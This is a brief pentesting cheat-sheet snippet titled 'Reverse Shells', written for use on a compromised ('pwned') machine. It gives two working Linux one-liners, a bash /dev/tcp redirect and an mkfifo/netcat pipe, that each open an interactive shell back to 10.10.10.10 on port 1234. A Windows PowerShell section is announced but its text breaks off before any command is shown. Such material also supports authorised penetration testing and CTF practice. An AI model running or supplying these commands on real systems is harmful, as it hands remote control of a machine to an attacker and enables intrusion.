
## Reverse Shells:

### Linux:
###### *To get reverse shell on the pwned linux system:*
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```
*OR*
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

### Windows:
powershell command to get reverse shell on the windows system:

